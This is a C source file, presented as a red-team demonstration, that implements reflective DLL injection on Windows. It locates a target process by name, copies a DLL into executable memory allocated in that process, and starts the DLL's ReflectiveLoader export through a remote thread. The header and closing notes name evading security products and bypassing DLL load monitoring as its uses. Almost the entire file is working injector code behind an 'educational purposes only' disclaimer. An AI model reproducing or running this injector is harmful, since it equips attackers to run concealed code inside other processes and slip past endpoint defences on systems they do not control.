/**
* @file reflective_dll_injection.c
* @brief Demonstrates reflective DLL injection technique
* 
* This file implements reflective DLL injection, a technique that allows loading
* a DLL entirely from memory without touching disk or using the standard Windows
* loader APIs. The DLL itself contains a special reflective loader function that
* handles its own loading process.
* 
* WARNING: This code is for educational purposes only. Do not use these techniques
* to bypass security controls without proper authorization.
* 
* Compilation (MSYS2/MinGW):
* gcc -std=c11 reflective_dll_injection.c -o reflective_dll_injection.exe
* 
* Red Team Applications:
* - Evading detection by security products
* - Loading DLLs from memory without touching disk
* - Bypassing DLL load monitoring
* - Understanding how advanced malware loaders work
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

// Define the prototype for the reflective loader function
typedef HMODULE (*ReflectiveLoader_t)(VOID);

// Function prototypes
BOOL MapDLLToMemory(const char* filePath, PVOID* baseAddress, PDWORD fileSize);
BOOL InjectReflectiveDLL(DWORD processId, PVOID dllBuffer, DWORD dllSize);
DWORD GetProcessIdByName(const char* processName);
PVOID FindReflectiveLoader(PVOID dllBuffer);
BOOL WriteMemoryToProcess(HANDLE hProcess, PVOID buffer, DWORD size, PVOID* remoteAddress);
BOOL CreateRemoteThreadInProcess(HANDLE hProcess, PVOID startAddress, PVOID parameter, PHANDLE threadHandle);

/**
* @brief Main function that demonstrates reflective DLL injection
*/
int main(int argc, char* argv[]) {
    printf("=== Reflective DLL Injection Demonstration ===\n\n");
    
    if (argc < 3) {
        printf("Usage: %s <reflective DLL path> <target process name>\n", argv[0]);
        return 1;
    }
    
    const char* dllPath = argv[1];
    const char* processName = argv[2];
    
    printf("DLL path: %s\n", dllPath);
    printf("Target process: %s\n", processName);
    
    // Get the process ID of the target process
    DWORD processId = GetProcessIdByName(processName);
    if (processId == 0) {
        printf("Error: Could not find process '%s'\n", processName);
        return 1;
    }
    
    printf("Target process ID: %lu\n", processId);
    
    // Map the DLL into memory
    PVOID dllBuffer = NULL;
    DWORD dllSize = 0;
    if (!MapDLLToMemory(dllPath, &dllBuffer, &dllSize)) {
        printf("Error: Could not map DLL to memory\n");
        return 1;
    }
    
    printf("DLL mapped to memory at 0x%p (Size: %u bytes)\n", dllBuffer, dllSize);
    
    // Find the reflective loader function
    PVOID reflectiveLoader = FindReflectiveLoader(dllBuffer);
    if (!reflectiveLoader) {
        printf("Error: Could not find reflective loader function in DLL\n");
        free(dllBuffer);
        return 1;
    }
    
    printf("Reflective loader function found at offset 0x%zX\n", 
           (SIZE_T)((BYTE*)reflectiveLoader - (BYTE*)dllBuffer));
    
    // Inject the DLL into the target process
    if (!InjectReflectiveDLL(processId, dllBuffer, dllSize)) {
        printf("Error: Could not inject DLL into process\n");
        free(dllBuffer);
        return 1;
    }
    
    printf("DLL successfully injected into process\n");
    
    // Clean up
    free(dllBuffer);
    
    return 0;
}

/**
* @brief Maps a DLL file from disk into memory
* 
* @param filePath Path to the DLL file
* @param baseAddress Pointer to receive the base address of the mapped file
* @param fileSize Pointer to receive the size of the mapped file
* @return BOOL TRUE if successful, FALSE otherwise
*/
BOOL MapDLLToMemory(const char* filePath, PVOID* baseAddress, PDWORD fileSize) {
    // Open the file
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error: Could not open file (Error code: %lu)\n", GetLastError());
        return FALSE;
    }
    
    // Get the file size
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) {
        printf("Error: Could not get file size (Error code: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Allocate memory for the file
    PVOID buffer = malloc(size);
    if (!buffer) {
        printf("Error: Could not allocate memory for file\n");
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Read the file into memory
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, size, &bytesRead, NULL) || bytesRead != size) {
        printf("Error: Could not read file (Error code: %lu)\n", GetLastError());
        free(buffer);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Close the file handle
    CloseHandle(hFile);
    
    // Verify DOS signature (MZ)
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Error: Invalid DOS signature\n");
        free(buffer);
        return FALSE;
    }
    
    // Verify NT signature (PE\0\0)
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)buffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Error: Invalid NT signature\n");
        free(buffer);
        return FALSE;
    }
    
    // Verify that it's a DLL
    if (!(ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL)) {
        printf("Error: File is not a DLL\n");
        free(buffer);
        return FALSE;
    }
    
    // Set output parameters
    *baseAddress = buffer;
    *fileSize = size;
    
    return TRUE;
}

/**
* @brief Injects a reflective DLL into a target process
* 
* @param processId ID of the target process
* @param dllBuffer Pointer to the DLL in memory
* @param dllSize Size of the DLL
* @return BOOL TRUE if successful, FALSE otherwise
*/
BOOL InjectReflectiveDLL(DWORD processId, PVOID dllBuffer, DWORD dllSize) {
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                                 PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                                 FALSE, processId);
    if (!hProcess) {
        printf("Error: Could not open process (Error code: %lu)\n", GetLastError());
        return FALSE;
    }
    
    printf("Opened process with handle 0x%p\n", hProcess);
    
    // Find the reflective loader function
    PVOID reflectiveLoader = FindReflectiveLoader(dllBuffer);
    if (!reflectiveLoader) {
        printf("Error: Could not find reflective loader function in DLL\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Calculate the offset of the reflective loader from the DLL base
    SIZE_T reflectiveLoaderOffset = (SIZE_T)((BYTE*)reflectiveLoader - (BYTE*)dllBuffer);
    printf("Reflective loader offset: 0x%zX\n", reflectiveLoaderOffset);
    
    // Write the DLL to the target process
    PVOID remoteDllBase = NULL;
    if (!WriteMemoryToProcess(hProcess, dllBuffer, dllSize, &remoteDllBase)) {
        printf("Error: Could not write DLL to process\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("DLL written to process at 0x%p\n", remoteDllBase);
    
    // Calculate the address of the reflective loader in the target process
    PVOID remoteReflectiveLoader = (BYTE*)remoteDllBase + reflectiveLoaderOffset;
    printf("Remote reflective loader address: 0x%p\n", remoteReflectiveLoader);
    
    // Create a remote thread to execute the reflective loader
    HANDLE hThread = NULL;
    if (!CreateRemoteThreadInProcess(hProcess, remoteReflectiveLoader, NULL, &hThread)) {
        printf("Error: Could not create remote thread\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("Remote thread created with handle 0x%p\n", hThread);
    
    // Wait for the thread to complete
    printf("Waiting for reflective loader to complete...\n");
    WaitForSingleObject(hThread, INFINITE);
    
    // Get the thread exit code
    DWORD exitCode = 0;
    if (!GetExitCodeThread(hThread, &exitCode)) {
        printf("Warning: Could not get thread exit code (Error code: %lu)\n", GetLastError());
    } else {
        printf("Thread completed with exit code 0x%08lX\n", exitCode);
    }
    
    // Clean up
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return TRUE;
}

/**
* @brief Finds the reflective loader function in a DLL
* 
* @param dllBuffer Pointer to the DLL in memory
* @return PVOID Pointer to the reflective loader function, or NULL if not found
*/
PVOID FindReflectiveLoader(PVOID dllBuffer) {
    // Get the DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
    
    // Get the NT headers
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dllBuffer + dosHeader->e_lfanew);
    
    // Get the export directory
    DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    
    // If there's no export directory, return NULL
    if (exportRVA == 0 || exportSize == 0) {
        printf("Warning: DLL has no export directory\n");
        return NULL;
    }
    
    // Get the export directory
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)dllBuffer + exportRVA);
    
    // Get the export tables
    PDWORD nameRVAs = (PDWORD)((BYTE*)dllBuffer + exportDir->AddressOfNames);
    PWORD ordinals = (PWORD)((BYTE*)dllBuffer + exportDir->AddressOfNameOrdinals);
    PDWORD functionRVAs = (PDWORD)((BYTE*)dllBuffer + exportDir->AddressOfFunctions);
    
    // Look for the reflective loader function
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        // Get the function name
        const char* functionName = (const char*)((BYTE*)dllBuffer + nameRVAs[i]);
        
        // Check if it's the reflective loader function
        if (strcmp(functionName, "ReflectiveLoader") == 0) {
            // Get the function RVA
            DWORD functionRVA = functionRVAs[ordinals[i]];
            
            // Return the function address
            return (BYTE*)dllBuffer + functionRVA;
        }
    }
    
    // Function not found
    printf("Warning: ReflectiveLoader function not found in DLL\n");
    return NULL;
}

/**
* @brief Gets the process ID of a process by its name
* 
* @param processName Name of the process
* @return DWORD Process ID, or 0 if not found
*/
DWORD GetProcessIdByName(const char* processName) {
    // Create a snapshot of all processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Error: Could not create process snapshot (Error code: %lu)\n", GetLastError());
        return 0;
    }
    
    // Initialize the process entry structure
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    
    // Get the first process
    if (!Process32First(hSnapshot, &processEntry)) {
        printf("Error: Could not get first process (Error code: %lu)\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }
    
    // Iterate through all processes
    do {
        // Convert process name to lowercase for case-insensitive comparison
        char currentProcessName[MAX_PATH];
        strcpy(currentProcessName, processEntry.szExeFile);
        for (int i = 0; currentProcessName[i]; i++) {
            currentProcessName[i] = tolower(currentProcessName[i]);
        }
        
        // Convert target process name to lowercase
        char targetProcessName[MAX_PATH];
        strcpy(targetProcessName, processName);
        for (int i = 0; targetProcessName[i]; i++) {
            targetProcessName[i] = tolower(targetProcessName[i]);
        }
        
        // Check if the process name matches
        if (strcmp(currentProcessName, targetProcessName) == 0) {
            // Found the process
            DWORD processId = processEntry.th32ProcessID;
            CloseHandle(hSnapshot);
            return processId;
        }
    } while (Process32Next(hSnapshot, &processEntry));
    
    // Process not found
    CloseHandle(hSnapshot);
    return 0;
}

/**
* @brief Writes memory to a process
* 
* @param hProcess Handle to the target process
* @param buffer Pointer to the buffer to write
* @param size Size of the buffer
* @param remoteAddress Pointer to receive the address of the allocated memory in the target process
* @return BOOL TRUE if successful, FALSE otherwise
*/
BOOL WriteMemoryToProcess(HANDLE hProcess, PVOID buffer, DWORD size, PVOID* remoteAddress) {
    // Allocate memory in the target process
    PVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        printf("Error: Could not allocate memory in process (Error code: %lu)\n", GetLastError());
        return FALSE;
    }
    
    // Write the buffer to the target process
    if (!WriteProcessMemory(hProcess, remoteBuffer, buffer, size, NULL)) {
        printf("Error: Could not write memory to process (Error code: %lu)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Set the output parameter
    *remoteAddress = remoteBuffer;
    
    return TRUE;
}

/**
* @brief Creates a remote thread in a process
* 
* @param hProcess Handle to the target process
* @param startAddress Address of the thread start routine
* @param parameter Parameter to pass to the thread start routine
* @param threadHandle Pointer to receive the handle to the created thread
* @return BOOL TRUE if successful, FALSE otherwise
*/
BOOL CreateRemoteThreadInProcess(HANDLE hProcess, PVOID startAddress, PVOID parameter, PHANDLE threadHandle) {
    // Create a remote thread in the target process
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)startAddress, 
                                       parameter, 0, NULL);
    if (!hThread) {
        printf("Error: Could not create remote thread (Error code: %lu)\n", GetLastError());
        return FALSE;
    }
    
    // Set the output parameter
    *threadHandle = hThread;
    
    return TRUE;
}

/**
* Additional Notes:
* 
* 1. Reflective DLL Injection:
*    - Reflective DLL injection is a technique that allows loading a DLL entirely from memory
*    - The DLL contains a special reflective loader function that handles its own loading process
*    - This bypasses the standard Windows loader and can evade detection by security products
* 
* 2. Reflective Loader Function:
*    - The reflective loader function is responsible for loading the DLL into memory
*    - It performs the same tasks as the standard Windows loader, but entirely from memory
*    - This includes parsing the PE headers, allocating memory, copying sections, fixing relocations,
*      and resolving imports
* 
* 3. Process Injection:
*    - Process injection involves writing code or data to another process
*    - This can be used to execute code in the context of another process
*    - Common techniques include DLL injection, shellcode injection, and reflective DLL injection
* 
* 4. Security Implications:
*    - Reflective DLL injection is often used by malware to evade detection
*    - It can bypass DLL load monitoring and other security controls
*    - Understanding these techniques is important for both offensive and defensive security
* 
* 5. Limitations of This Implementation:
*    - This implementation is simplified for educational purposes
*    - It assumes that the DLL contains a function named "ReflectiveLoader"
*    - A real-world implementation would need to be more robust
* 
* 6. Reflective DLL Requirements:
*    - The DLL must contain a function named "ReflectiveLoader"
*    - This function must be exported and must handle the loading process
*    - The function should return the base address of the loaded DLL
*/

